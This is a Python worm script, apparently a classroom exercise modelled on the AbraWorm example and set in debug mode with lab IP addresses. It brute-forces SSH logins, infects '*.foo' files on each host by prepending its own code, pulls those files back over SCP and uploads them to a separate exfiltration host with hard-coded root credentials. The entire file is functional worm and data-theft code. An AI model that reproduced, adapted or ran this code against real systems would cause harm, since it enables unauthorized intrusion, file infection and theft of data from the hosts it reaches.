#!/usr/bin/env python
import sys
import os
import glob
import random
import paramiko
import scp
import select
import signal

debug = 1

NHOSTS = NUSERNAMES = NPASSWDS = 3

def get_new_usernames(how_many):
    if debug: return ['root']
def get_fresh_ipaddresses(how_many):
    if debug: return ['172.17.0.2']
def get_new_passwds(how_many):
    if debug: return ['mypassword']
IN = open(sys.argv[0], 'r')
virus = [line for (i,line) in enumerate(IN) if i < 100] # only upto last line of this virus file
while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously 
                    # infected:
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls *.foo')
                    error = stderr.readlines()
                    if error: 
                        print(error)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))
                    print("new edited")
                    content="Hello from Hackerman\n hello thjdajsjdkjasssss\njdhkasdhajsdkhasdjka\nhdkjadhjak\n"
                    for item in files_of_interest_at_target:
                        with ssh.open_sftp() as sftp:
                            with sftp.file(item, 'r') as read_file:
                                all_of_it=read_file.readlines()

                            with sftp.file(item, 'w') as remote_file:
                                remote_file.writelines(virus)
                                all_of_it=["#"+line for line in all_of_it]
                                remote_file.writelines(all_of_it)


                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                    # # Now deposit a copy of AbraWorm.py at the target host:
                    print("dumped")
                    # scpcon.put(sys.argv[0])              
                    scpcon.close()
                except:
                    continue


                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect('172.17.0.3',port=22,username='root',password='mypassword',timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exhiltration host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except: 
                        print("No uploading of exfiltrated files\n")
                        continue

                    for item in files_of_interest_at_target:
                        try:
                            os.remove(item)
                            
                        except:
                            print("error")
                
                print("done")
    if debug: break
    # end
    
